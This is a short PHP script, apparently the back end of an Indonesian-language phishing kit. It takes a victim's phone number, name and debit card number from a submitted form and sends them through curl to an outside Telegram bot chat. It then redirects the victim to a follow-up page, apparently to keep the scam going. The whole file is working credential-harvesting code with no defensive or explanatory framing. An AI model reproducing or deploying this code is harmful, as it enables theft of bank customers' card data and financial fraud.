<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorku"] = $_POST ['nomorku'];
$_SESSION["debit"] = $_POST ['debit'];
$_SESSION["nama"] = $_POST ['nama'];

$message = "%C2%B0%CC%B0%CC%83%E2%80%A2%CC%B0%CC%83~%CC%B0%CC%83%E2%9C%A5%CC%B0%CC%83%E0%BC%86%CC%B0%CC%83%E2%92%B7%CC%B0%CC%83%E2%92%B8%CC%B0%CC%83%E2%92%B6%CC%B0%CC%83%E2%98%AD%CC%B0%CC%83%E2%9C%A5%CC%B0%CC%83~%CC%B0%CC%83%E2%80%A2%CC%B0%CC%83%C2%B0%CC%B0%CC%83%22%CC%B0%CC%83". "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ".  $_POST ['nomor']. "\n𝗡𝗮𝗺𝗮 : ". $_POST ['nama']. "\n𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 : ". $_POST ['debit'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  konf.html");
?> 